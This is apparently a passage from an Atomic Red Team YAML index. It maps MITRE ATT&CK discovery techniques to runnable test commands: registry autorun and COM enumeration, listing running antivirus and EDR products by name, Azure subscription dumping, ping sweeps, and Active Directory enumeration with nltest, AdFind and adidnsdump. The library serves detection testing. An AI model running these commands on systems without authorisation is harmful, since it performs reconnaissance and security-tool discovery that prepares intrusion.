          -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item
          -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\nGet-Item
          -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item
          -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item
          -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item
          -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-Item
          -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-ChildItem
          -Path \"HKLM:system\\currentcontrolset\\services\" \nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item
          -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"\nGet-ChildItem
          -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nGet-ChildItem
          -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n"
        name: powershell
        elevation_required: true
    - name: Enumerate COM Objects in Registry with Powershell
      auto_generated_guid: 0d80d088-a84c-4353-af1a-fc8b439f1564
      description: "This test is designed to enumerate the COM objects listed in HKCR,
        then output their methods and CLSIDs to a text file.\nAn adversary could then
        use this information to identify COM objects that might be vulnerable to abuse,
        such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects"
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: File to output list of COM objects to
          type: string
          default: "$env:temp\\T1592.002Test1.txt"
      executor:
        command: |
          New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
          Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt
          ForEach($CLSID in Get-Content "$env:temp\clsids.txt")
          {try{write-output "$($Position)-$($CLSID)"
          write-output "------------"| out-file #{output_file} -append
          write-output $($CLSID)| out-file #{output_file} -append
          $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
          $handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append
          $position += 1} catch{}}
        cleanup_command: "remove-item #{output_file} -force -erroraction silentlycontinue\nremove-item
          $env:temp\\clsids.txt -force -erroraction silentlycontinue      \n"
        name: powershell
  T1614:
    technique:
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      - IaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Pooja Natarajan, NEC Corporation India
      - Hiroki Nagahama, NEC Corporation
      - Manikantan Srinivasan, NEC Corporation India
      - Wes Hurd
      - Katie Nickels, Red Canary
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c877e33f-1df6-40d6-b1e7-ce70f16f4979
      type: attack-pattern
      created: '2021-04-01T16:42:08.735Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1614
        url: https://attack.mitre.org/techniques/T1614
      - source_name: FBI Ragnar Locker 2020
        url: https://assets.documentcloud.org/documents/20413525/fbi-flash-indicators-of-compromise-ragnar-locker-ransomware-11192020-bc.pdf
        description: FBI. (2020, November 19). Indicators of Compromise Associated
          with Ragnar Locker Ransomware. Retrieved April 1, 2021.
      - source_name: Sophos Geolocation 2016
        url: https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/
        description: 'Wisniewski, C. (2016, May 3). Location-based threats: How cybercriminals
          target you based on where you live. Retrieved April 1, 2021.'
      - source_name: Bleepingcomputer RAT malware 2020
        url: https://www.bleepingcomputer.com/news/security/new-rat-malware-gets-commands-via-discord-has-ransomware-feature/
        description: Abrams, L. (2020, October 23). New RAT malware gets commands
          via Discord, has ransomware feature. Retrieved April 1, 2021.
      - source_name: AWS Instance Identity Documents
        url: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-identity-documents.html
        description: Amazon. (n.d.). Instance identity documents. Retrieved April
          2, 2021.
      - source_name: Microsoft Azure Instance Metadata 2021
        url: https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=windows
        description: Microsoft. (2021, February 21). Azure Instance Metadata Service
          (Windows). Retrieved April 2, 2021.
      - source_name: Securelist Trasparent Tribe 2020
        url: https://securelist.com/transparent-tribe-part-1/98127/
        description: 'Dedola, G. (2020, August 20). Transparent Tribe: Evolution analysis,
          part 1. Retrieved April 1, 2021.'
      modified: '2021-10-15T22:00:56.438Z'
      name: System Location Discovery
      description: |2-

        Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)

        Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system location information. Remote access tools with built-in features may interact directly with the Windows API, such as calling <code> GetLocaleInfoW</code> to gather information.(Citation: FBI Ragnar Locker 2020)

        Monitor traffic flows to geo-location service provider sites, such as ip-api and ipinfo.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1518.001:
    technique:
      modified: '2023-04-21T12:30:00.939Z'
      name: 'Software Discovery: Security Software Discovery'
      description: |-
        Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

        Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Isif Ibrahima, Mandiant
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        In cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Firewall: Firewall Metadata'
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Firewall: Firewall Enumeration'
      type: attack-pattern
      id: attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384
      created: '2020-02-21T21:16:18.066Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1518/001
        external_id: T1518.001
      - source_name: Expel IO Evil in AWS
        description: A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding
          Evil in AWS. Retrieved June 25, 2020.
        url: https://expel.io/blog/finding-evil-in-aws/
      - source_name: DescribeSecurityGroups - Amazon Elastic Compute Cloud
        description: Amazon Web Services, Inc. . (2022). DescribeSecurityGroups. Retrieved
          January 28, 2022.
        url: https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeSecurityGroups.html
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1518.001
    atomic_tests:
    - name: Security Software Discovery
      auto_generated_guid: f92a380f-ced9-491f-b338-95a991418ce2
      description: |
        Methods to identify Security Software on an endpoint

        when sucessfully executed, the test is going to display running processes, firewall configuration on network profiles
        and specific security software.
      supported_platforms:
      - windows
      executor:
        command: |
          netsh.exe advfirewall  show allprofiles
          tasklist.exe
          tasklist.exe | findstr /i virus
          tasklist.exe | findstr /i cb
          tasklist.exe | findstr /i defender
          tasklist.exe | findstr /i cylance
          tasklist.exe | findstr /i mc
          tasklist.exe | findstr /i "virus cb defender cylance mc"
        name: command_prompt
    - name: Security Software Discovery - powershell
      auto_generated_guid: 7f566051-f033-49fb-89de-b6bacab730f0
      description: |
        Methods to identify Security Software on an endpoint

        when sucessfully executed, powershell is going to processes related AV products if they are running.
        Note that, depending on the privilege of current user, get-process | ?{$_.Description -like "*"} may not return the processes related to AV products of the check.
        For instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like "*"},
        if you know the name of those processes.
      supported_platforms:
      - windows
      executor:
        command: |
          get-process | ?{$_.Description -like "*virus*"}
          get-process | ?{$_.Description -like "*carbonblack*"}
          get-process | ?{$_.Description -like "*defender*"}
          get-process | ?{$_.Description -like "*cylance*"}
          get-process | ?{$_.Description -like "*mc*"}
          get-process | ?{$_.ProcessName -like "*mc*"}
        name: powershell
    - name: Security Software Discovery - ps (macOS)
      auto_generated_guid: ba62ce11-e820-485f-9c17-6f3c857cd840
      description: |
        Methods to identify Security Software on an endpoint
        when sucessfully executed, command shell  is going to display AV/Security software it is running.
      supported_platforms:
      - macos
      executor:
        command: 'ps aux | egrep ''Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu''

          '
        name: sh
    - name: Security Software Discovery - ps (Linux)
      auto_generated_guid: 23b91cd2-c99c-4002-9e41-317c63e024a2
      description: |
        Methods to identify Security Software on an endpoint
        when sucessfully executed, command shell  is going to display AV/Security software it is running.
      supported_platforms:
      - linux
      executor:
        command: 'ps aux | egrep ''falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd''

          '
        name: sh
    - name: Security Software Discovery - Sysmon Service
      auto_generated_guid: fe613cf3-8009-4446-9a0f-bc78a15b66c9
      description: |
        Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).

        when sucessfully executed, the test is going to display sysmon driver instance if it is installed.
      supported_platforms:
      - windows
      executor:
        command: 'fltmc.exe | findstr.exe 385201

          '
        name: command_prompt
        elevation_required: true
    - name: Security Software Discovery - AV Discovery via WMI
      auto_generated_guid: 1553252f-14ea-4d3b-8a08-d7a4211aa945
      description: |
        Discovery of installed antivirus products via a WMI query.

        when sucessfully executed, the test is going to display installed AV software.
      supported_platforms:
      - windows
      executor:
        command: wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
          Get displayName /Format:List
        name: command_prompt
        elevation_required: true
  T1526:
    technique:
      modified: '2023-05-04T18:01:44.086Z'
      name: Cloud Service Discovery
      description: |-
        An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.

        Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)

        For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)

        Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable Cloud Logs](https://attack.mitre.org/techniques/T1562/008).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Suzy Schapperle - Microsoft Azure Red Team
      - Praetorian
      - Thanabodi Phrakhun, I-SECURE
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Google Workspace
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Cloud Service: Cloud Service Enumeration'
      type: attack-pattern
      id: attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db
      created: '2019-08-30T13:01:10.120Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1526
        external_id: T1526
      - source_name: Azure AD Graph API
        description: Microsoft. (2016, March 26). Operations overview | Graph API
          concepts. Retrieved June 18, 2020.
        url: https://docs.microsoft.com/en-us/previous-versions/azure/ad/graph/howto/azure-ad-graph-api-operations-overview
      - source_name: Azure - Resource Manager API
        description: Microsoft. (2019, May 20). Azure Resource Manager. Retrieved
          June 17, 2020.
        url: https://docs.microsoft.com/en-us/rest/api/resources/
      - source_name: Azure - Stormspotter
        description: Microsoft. (2020). Azure Stormspotter GitHub. Retrieved June
          17, 2020.
        url: https://github.com/Azure/Stormspotter
      - source_name: GitHub Pacu
        description: Rhino Security Labs. (2019, August 22). Pacu. Retrieved October
          17, 2019.
        url: https://github.com/RhinoSecurityLabs/pacu
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1526
    atomic_tests:
    - name: Azure - Dump Subscription Data with MicroBurst
      auto_generated_guid: 1e40bb1d-195e-401e-a86b-c192f55e005c
      description: "Upon successful execution, this test will enumerate all resources
        that are contained within a valid Azure subscription. \nThe resources enumerated
        will display on screen, as well as several csv files and folders will be output
        to a specified directory, listing what resources were discovered by the script.
        \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n"
      supported_platforms:
      - iaas:azure
      input_arguments:
        username:
          description: Azure AD username
          type: string
          default: 
        password:
          description: Azure AD password
          type: string
          default: T1082Az
        output_directory:
          description: Directory to output results to
          type: string
          default: "$env:temp\\T1526Test1"
        subscription_name:
          description: Azure subscription name to scan
          type: string
          default: 
      dependency_executor_name: powershell
      dependencies:
      - description: 'The Get-AzDomainInfo script must exist in $env:temp.

          '
        prereq_command: 'if (test-path $env:temp\Get-AzDomainInfo.ps1){exit 0} else
          {exit 1}

          '
        get_prereq_command: 'invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1"
          -outfile "$env:temp\Get-AzDomainInfo.ps1"

          '
      - description: 'The Az module must be installed.

          '
        prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
          {exit 0} else {exit 1}} catch {exit 1}

          '
        get_prereq_command: 'Install-Module -Name Az -Force

          '
      executor:
        command: |
          import-module "$env:temp\Get-AzDomainInfo.ps1"
          $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
          Connect-AzAccount -Credential $Credential | out-null
          Get-AzDomainInfo -folder #{output_directory} -subscription "#{subscription_name}" -verbose
        cleanup_command: 'remove-item #{output_directory} -recurse -force -erroraction
          silentlycontinue

          '
        name: powershell
  T1018:
    technique:
      modified: '2023-03-30T21:01:50.033Z'
      name: Remote System Discovery
      description: "Adversaries may attempt to get a listing of other systems by IP
        address, hostname, or other logical identifier on a network that may be used
        for Lateral Movement from the current system. Functionality could exist within
        remote access tools to enable this, but utilities available on the operating
        system could also be used such as  [Ping](https://attack.mitre.org/software/S0097)
        or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).\n\nAdversaries
        may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code>
        or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099)
        cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries
        may also target discovery of network infrastructure as well as leverage [Network
        Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network
        devices to gather detailed information about systems within a network (e.g.
        <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation:
        CISA AR21-126A FIVEHANDS May 2021)  \n"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Daniel Stepanic, Elastic
      - RedHuntLabs, @redhuntlabs
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Normal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        Monitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '3.4'
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Command: Command Execution'
      - 'File: File Access'
      - 'Process: Process Creation'
      type: attack-pattern
      id: attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735
      created: '2017-05-31T21:30:28.187Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1018
        external_id: T1018
      - source_name: CISA AR21-126A FIVEHANDS May 2021
        description: CISA. (2021, May 6). Analysis Report (AR21-126A) FiveHands Ransomware.
          Retrieved June 7, 2021.
        url: https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a
      - source_name: Elastic - Koadiac Detection with EQL
        description: 'Stepanic, D.. (2020, January 13). Embracing offensive tooling:
          Building detections against Koadic using EQL. Retrieved November 30, 2020.'
        url: https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1018
    atomic_tests:
    - name: Remote System Discovery - net
      auto_generated_guid: 85321a9c-897f-4a60-9f20-29788e50bccd
      description: |
        Identify remote systems with net.exe.

        Upon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.
      supported_platforms:
      - windows
      executor:
        command: |
          net view /domain
          net view
        name: command_prompt
    - name: Remote System Discovery - net group Domain Computers
      auto_generated_guid: f1bf6c8f-9016-4edf-aff9-80b65f5d711f
      description: |
        Identify remote systems with net.exe querying the Active Directory Domain Computers group.

        Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Computers" group. Output will be via stdout.
      supported_platforms:
      - windows
      executor:
        command: 'net group "Domain Computers" /domain

          '
        name: command_prompt
    - name: Remote System Discovery - nltest
      auto_generated_guid: 52ab5108-3f6f-42fb-8ba3-73bc054f22c8
      description: |
        Identify domain controllers for specified domain.

        Upon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.
      supported_platforms:
      - windows
      input_arguments:
        target_domain:
          description: Domain to query for domain controllers
          type: string
          default: "%userdnsdomain%"
      executor:
        command: 'nltest.exe /dclist:#{target_domain}

          '
        name: command_prompt
    - name: Remote System Discovery - ping sweep
      auto_generated_guid: 6db1f57f-d1d5-4223-8a66-55c9c65a9592
      description: |
        Identify remote systems via ping sweep.

        Upon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.
      supported_platforms:
      - windows
      input_arguments:
        start_host:
          description: Last octet starting value for ping sweep.
          type: string
          default: '1'
        stop_host:
          description: Last octet ending value for ping sweep.
          type: string
          default: '254'
        subnet:
          description: Subnet used for ping sweep.
          type: string
          default: 192.168.1
      executor:
        command: "for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100
          #{subnet}.%i  \n"
        name: command_prompt
    - name: Remote System Discovery - arp
      auto_generated_guid: 2d5a61f5-0447-4be4-944a-1f8530ed6574
      description: "Identify remote systems via arp. \n\nUpon successful execution,
        cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n"
      supported_platforms:
      - windows
      executor:
        command: 'arp -a

          '
        name: command_prompt
    - name: Remote System Discovery - arp nix
      auto_generated_guid: acb6b1ff-e2ad-4d64-806c-6c35fe73b951
      description: |
        Identify remote systems via arp.

        Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
      supported_platforms:
      - linux
      - macos
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if arp command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v arp)" ]; then exit 0; else exit 1;
          fi;

          '
        get_prereq_command: "(which yum && yum -y install net-tools)||(which apt-get
          && apt-get install -y net-tools)\n"
      executor:
        command: 'arp -a | grep -v ''^?''

          '
        name: sh
    - name: Remote System Discovery - sweep
      auto_generated_guid: 96db2632-8417-4dbb-b8bb-a8b92ba391de
      description: |
        Identify remote systems via ping sweep.

        Upon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.
      supported_platforms:
      - linux
      - macos
      input_arguments:
        start_host:
          description: Subnet used for ping sweep.
          type: string
          default: '1'
        stop_host:
          description: Subnet used for ping sweep.
          type: string
          default: '254'
        subnet:
          description: Subnet used for ping sweep.
          type: string
          default: 192.168.1
      executor:
        command: 'for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip;
          [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done

          '
        name: sh
    - name: Remote System Discovery - nslookup
      auto_generated_guid: baa01aaa-5e13-45ec-8a0d-e46c93c9760f
      description: |
        Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.

        Upon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.
      supported_platforms:
      - windows
      executor:
        command: |
          $localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
          $pieces = $localip.split(".")
          $firstOctet = $pieces[0]
          $secondOctet = $pieces[1]
          $thirdOctet = $pieces[2]
          foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
        name: powershell
        elevation_required: true
    - name: Remote System Discovery - adidnsdump
      auto_generated_guid: 95e19466-469e-4316-86d2-1dc401b5a959
      description: |
        This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks
        Python 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.
        Successful execution of this test will list dns zones in the terminal.
      supported_platforms:
      - windows
      input_arguments:
        user_name:
          description: username including domain.
          type: string
          default: domain\user
        acct_pass:
          description: Account password.
          type: string
          default: password
        host_name:
          description: hostname or ip address to connect to.
          type: string
          default: 192.168.1.1
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must have python 3 installed

          '
        prereq_command: 'if (python --version) {exit 0} else {exit 1}

          '
        get_prereq_command: 'echo "Python 3 must be installed manually"

          '
      - description: 'Computer must have pip installed

          '
        prereq_command: 'if (pip3 -V) {exit 0} else {exit 1}

          '
        get_prereq_command: 'echo "PIP must be installed manually"

          '
      - description: 'adidnsdump must be installed and part of PATH

          '
        prereq_command: 'if (cmd /c adidnsdump -h) {exit 0} else {exit 1}

          '
        get_prereq_command: 'pip3 install adidnsdump

          '
      executor:
        command: 'adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}

          '
        name: command_prompt
        elevation_required: true
    - name: Adfind - Enumerate Active Directory Computer Objects
      auto_generated_guid: a889f5be-2d54-4050-bd05-884578748bb4
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects
        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -f (objectcategory=computer)\n"
        name: command_prompt
    - name: Adfind - Enumerate Active Directory Domain Controller Objects
      auto_generated_guid: 5838c31e-a0e2-4b9f-b60a-d79d2cb7995e
      description: |
        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects
        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
      supported_platforms:
      - windows
      input_arguments:
        adfind_path:
          description: Path to the AdFind executable
          type: path
          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})

          '
        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{adfind_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
      executor:
        command: "#{adfind_path} -sc dclist\n"
        name: command_prompt
    - name: Remote System Discovery - ip neighbour
      auto_generated_guid: 158bd4dd-6359-40ab-b13c-285b9ef6fa25
      description: "Use the ip neighbour command to display the known link layer (ARP
        table) addresses for hosts sharing the same network segment. \n"
      supported_platforms:
      - linux
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if ip command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v ip)" ]; then exit 0; else exit 1; fi;

          '
        get_prereq_command: 'apt-get install iproute2 -y

          '
